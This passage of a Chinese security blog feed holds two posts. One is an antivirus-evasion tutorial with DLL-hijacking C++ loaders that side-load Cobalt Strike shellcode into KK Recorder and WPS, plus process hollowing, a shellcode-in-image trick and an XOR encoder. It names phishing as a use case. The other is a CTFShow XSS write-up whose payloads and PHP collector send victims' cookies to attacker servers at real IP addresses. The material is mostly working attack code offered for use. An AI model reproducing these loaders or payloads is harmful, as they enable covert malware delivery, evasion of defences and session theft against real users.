class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#利用python载入dll文件</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;Dll1&#x27;</span>)</span><br><span class="line"><span class="comment">#调用dll文件内置方法函数</span></span><br><span class="line">lib.main()</span><br></pre></td></tr></table></figure><p>运行上线</p><h3 id="DLL劫持-白加黑-导入加载"><a href="#DLL劫持-白加黑-导入加载" class="headerlink" title="DLL劫持-白加黑-导入加载"></a>DLL劫持-白加黑-导入加载</h3><p>这里以kk录像机为例</p><p>启动kk录像机使用火绒剑进行分析</p><p><img src="/posts/facab1e5/image-20220829082438124.png" alt="image-20220829082438124"></p><p>可以看到kk录像机加载的dll文件,我们可以选择一个dll文件来进行劫持,尽量找文件较小的dll文件<br>这里选择libfontconfig-1.dll<br>接下来该构造一个dll了<br>和上文相同新建一个dll项目这次不用改后缀了<br>代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">HANDLE My_hThread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="comment">//CS生成32位shellcode</span></span><br><span class="line">DWORD  WINAPI  <span class="built_in">ceshi</span>(LPVOID pParameter)</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">//初次调用dll时执行下面代码</span></span><br><span class="line">        My_hThread = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;ceshi, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//新建线程</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:a</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span><span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    a = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x86生成<br>接下来利用Stud_PE来加载我们生成的dll<br>函数–右键add–选择生产的dll文件–选择函数test–添加到列表–添加<br>接下来将libfontconfig-1.dll以及我们生产的dll文件都拖到kk录像机安装目录<br>运行kk录像机成功上线但是对生产的dll文件依旧被杀<br>可以对shellcode利用aes或者xor混淆进一步处理</p><h3 id="C-amp-C-DLL劫持-白加黑-导出编译"><a href="#C-amp-C-DLL劫持-白加黑-导出编译" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-导出编译"></a>C&amp;C++-DLL劫持-白加黑-导出编译</h3><p>当遇到部分应用，对dll进行了防劫持的操作，上述方法失效时，可以使用导出编译<br>也就是把目标dll文件反编译然后做文章<br>这里使用wps中的et.exe劫持krpt.dll<br>利用工具Dependencies反编译dll文件<br><img src="/posts/facab1e5/image-20220829100942828.png" alt="image-20220829100942828"></p><p>和上文相同创建一个dll项目将反编译出来的文件拖入到项目文件夹,然后拖入到vs中<br>先修改.asm汇编文件删除所有jump语句<br>例如：<code>jmp pfnAL__krpt_RegisterWERHandler</code><br>接下来修改.asm的属性具体的修改方法会在.asm文件的前几行按照说法进行修改</p><p>注意配置和平台要和你要生成的结果一致</p><p><img src="/posts/facab1e5/image-20220829141832346.png" alt="image-20220829141832346"><br>先应用下面的才会出来<br><img src="/posts/facab1e5/image-20220829142012808.png" alt="image-20220829142012808"><br>接下来设置项目属性（注意平台以及配置要和你编译环境相同配置应该为release，平台x86就用win32 x64就用x64）<br><img src="/posts/facab1e5/image-20220829142733847.png" alt="image-20220829142733847"><br><img src="/posts/facab1e5/image-20220829142751524.png" alt="image-20220829142751524"></p><p>如果发生报错:LNK2026 模块对于 SAFESEH 映像是不安全的。<br>解决方法：<br>1.打开该项目的“属性页”对话框。<br>2.单击“链接器”文件夹。<br>3.单击“命令行”属性页。<br>4.将 &#x2F;SAFESEH:NO 键入“附加选项”框中，然后点击应用。</p><p>接下来要添加上线代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;krpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hexData[] = <span class="comment">//填入shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* v7A = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, _countof(hexData), <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)v7A, hexData, _countof(hexData));</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> ProcessInformation;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_STARTUPINFOA</span> StartupInfo;</span><br><span class="line"><span class="type">void</span>* v24;</span><br><span class="line">CONTEXT Context;</span><br><span class="line">DWORD DwWrite = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(StartupInfo));</span><br><span class="line">StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">BOOL result = <span class="built_in">CreateProcessA</span>(<span class="number">0</span>, (LPSTR)<span class="string">&quot;rundll32.exe&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x44</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line"><span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">Context.ContextFlags = <span class="number">65539</span>;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">v24 = <span class="built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="number">0</span>, _countof(hexData), <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class="line">Context.Eip = (DWORD)v24;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line"><span class="built_in">ResumeThread</span>(ProcessInformation.hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(ProcessInformation.hThread);</span><br><span class="line">result = <span class="built_in">CloseHandle</span>(ProcessInformation.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">TerminateProcess</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成dll命名为krpt.dll将原来的dll替换运行et.exe 成功上线</p><h3 id="C-amp-C-DLL劫持-白加黑-图片分离"><a href="#C-amp-C-DLL劫持-白加黑-图片分离" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-图片分离"></a>C&amp;C++-DLL劫持-白加黑-图片分离</h3><blockquote><p>由于dll并不免杀可以利用图片分离来进行免杀<br>利用项目:<a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a></p></blockquote><p>使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 dkmc.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gen</span><br><span class="line">set shellcode 这里是CS的shellcode</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>接下来修改dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;krpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        FILE* fp;  <span class="comment">// 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span></span><br><span class="line">        <span class="type">size_t</span> size;  <span class="comment">// 定义文件字节数变量size</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>* buffer;  <span class="comment">// 定义缓存指针变量</span></span><br><span class="line"></span><br><span class="line">        fp = <span class="built_in">fopen</span>(<span class="string">&quot;shell.bmp&quot;</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">//****修改为上方生成的图片****</span></span><br><span class="line">        <span class="comment">// fseek()负号前移，正号后移</span></span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);          <span class="comment">// 文件指针指向文件末尾</span></span><br><span class="line">        <span class="comment">// ftell()返回给定流 stream 的当前文件位置</span></span><br><span class="line">        size = <span class="built_in">ftell</span>(fp);                <span class="comment">// size值为文件大小</span></span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);          <span class="comment">// 文件指针指向文件开头</span></span><br><span class="line">        buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);    <span class="comment">// 动态申请图片大小的内存空间（数组指针）</span></span><br><span class="line">        <span class="built_in">fread</span>(buffer, size, <span class="number">1</span>, fp);  <span class="comment">// 从fp读取和显示1个size大小的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* v7A = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)v7A, buffer, size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> ProcessInformation;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_STARTUPINFOA</span> StartupInfo;</span><br><span class="line">        <span class="type">void</span>* v24;</span><br><span class="line">        CONTEXT Context;</span><br><span class="line">        DWORD DwWrite = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(StartupInfo));</span><br><span class="line">        StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">        BOOL result = <span class="built_in">CreateProcessA</span>(<span class="number">0</span>, (LPSTR)<span class="string">&quot;rundll32.exe&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x44</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">        <span class="keyword">if</span> (result)</span><br><span class="line">        &#123;</span><br><span class="line">            Context.ContextFlags = <span class="number">65539</span>;</span><br><span class="line">            <span class="built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            v24 = <span class="built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="number">0</span>, size, <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, size, &amp;DwWrite);</span><br><span class="line">            Context.Eip = (DWORD)v24;</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            <span class="built_in">ResumeThread</span>(ProcessInformation.hThread);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(ProcessInformation.hThread);</span><br><span class="line">            result = <span class="built_in">CloseHandle</span>(ProcessInformation.hProcess);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">TerminateProcess</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成dll重命名为krpt.dll 和生成图片一起拖入到et.exe文件夹 运行上线</p><p><strong>DLL劫持适用场景</strong><br>钓鱼，或给他人分享破解软件时 适用Dll劫持</p><h2 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h2><h3 id="Syscall底层-加载器生成-项目"><a href="#Syscall底层-加载器生成-项目" class="headerlink" title="Syscall底层-加载器生成-项目"></a>Syscall底层-加载器生成-项目</h3><blockquote><p>Windows下有两种处理器访问模式：用户模式（user mode）和内核模式（kernel mode）。用户模式下运行应用程序时，Windows 会为该程序创建一个新进程，提供一个私有虚拟地址空间和一个私有句柄表，因为私有，一个应用程序无法修改另一个应用程序的私有虚拟地址空间的数据；内核模式下，所有运行的代码都共享一个虚拟地址空间， 因此内核中驱动程序可能还会因为写入错误的地址空间导致其他驱动程序甚至系统出现错误。内核中包含了大部分操作系统的内部数据结构，所以用户模式下的应用程序在访问这些数据结构或调用内部Windows例程以执行特权操作的时候，必须先从用户模式切换到内核模式，这里就涉及到系统调用。</p></blockquote><blockquote><p>x86 windows 使用 sysenter 实现系统调用。<br>x64 windows 使用 syscall 实现系统调用。</p></blockquote><blockquote><p>参考链接:<br><a href="https://github.com/7BitsTeam/EDR-Bypass-demo">https://github.com/7BitsTeam/EDR-Bypass-demo</a><br><a href="https://github.com/icyguider/Shhhloader">https://github.com/icyguider/Shhhloader</a><br><a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a><br><a href="https://cloud.tencent.com/developer/article/1944012">https://cloud.tencent.com/developer/article/1944012</a></p></blockquote><p>使用Syscall生成的exe文件 直接调用系统底层的函数依赖，完成上线<br>常规后门exe文件，需要调用很多系统自带的 dll 文件才能完成上线</p><p>这里利用EDR-Bypass-demo项目中的demo进行测试<br><strong>demo1</strong><br>CS生成raw的shellcode<br>使用enc.py进行加密(注意加密后要把末尾的&#x3D;&#x3D;换成@@)然后填入到demo1.cpp(chapter4-demo3下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">all</span>=f.read()</span><br><span class="line">    array=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        array.append(i^<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#print(bytearray(array))</span></span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(<span class="built_in">bytearray</span>(array)))</span><br></pre></td></tr></table></figure><p><strong>demo2</strong><br>EDR-Bypass-demo项目中的chapter4-demo4 直接改shellcode和上文相同 生成解决方法即可上线</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_XSS</title>
      <link href="/posts/1e1eb3c9/"/>
      <url>/posts/1e1eb3c9/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFShow-Web入门-XSS"><a href="#CTFShow-Web入门-XSS" class="headerlink" title="CTFShow Web入门_XSS"></a>CTFShow Web入门_XSS</h1><blockquote><p>参考:<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p></blockquote><h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><blockquote><p>flag在cookie中</p></blockquote><p>可以利用xss平台或者使用自己服务器自己搭建一个写一个小脚本来获取cookie</p><p>服务器准备一个接受文件接受cookie get..php</p><p><a href="http://47.94.236.117/get.php?c=document.cookie">http://47.94.236.117/get.php?c=document.cookie</a></p><p>服务器脚本如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>windows.location.href&#x3D;”&#x2F;url” 当前页面打开URL页面</p><p>document.cookie 获取cookie</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看服务器下的cookie.txt</p><p>即可发现falg</p><h2 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h2><p><code>&lt;script&gt;</code>被过滤换<code>&lt;body&gt;</code></p><blockquote><p>平台为机器人触发xss所以尽量选择不需要鼠标触发的事件</p></blockquote><blockquote><p>onload为载入事件 不需要鼠标移动直接触发</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">window.location.href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="attr">document.cookie</span>;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web318"><a href="#Web318" class="headerlink" title="Web318"></a>Web318</h2><p>这次过滤了<code>&lt;img&gt;</code>换<code>&lt;svg&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location.href=&#x27;http://ip/get.php?c=&#x27;+document.cookie;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web319"><a href="#Web319" class="headerlink" title="Web319"></a>Web319</h2><p>同Web318</p><h2 id="Web320"><a href="#Web320" class="headerlink" title="Web320"></a>Web320</h2><p>过滤了<code>空格</code>利用<code>/</code>绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://ip/get.php?c=&#x27;+document.cookie;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="Web321-Web326"><a href="#Web321-Web326" class="headerlink" title="Web321-Web326"></a>Web321-Web326</h2><p>同Web320</p><h2 id="Web327"><a href="#Web327" class="headerlink" title="Web327"></a>Web327</h2><p>存储型xss没有过滤</p><p>收件人写admin</p><p>信的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h2><p>用户管理界面可以看到用户 账号 密码</p><p>可以把密码改为JS代码(获取cookie)，管理员查看页面会触发xss代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>读取cookie.txt获取到管理员的cookie</p><p>抓包点击用户管理将cookie替换为刚刚获得的管理员cookie登录成功后发现flag</p><h2 id="Web329"><a href="#Web329" class="headerlink" title="Web329"></a>Web329</h2><p>失效凭证 cookie一直在变</p><p>可以不使用cookie利用js代码获取网页源代码读取带有ctfshow的字段标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.138.124.233/get.php?c=&#x27;</span>+value.<span class="property">innerHTML</span>; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web330"><a href="#Web330" class="headerlink" 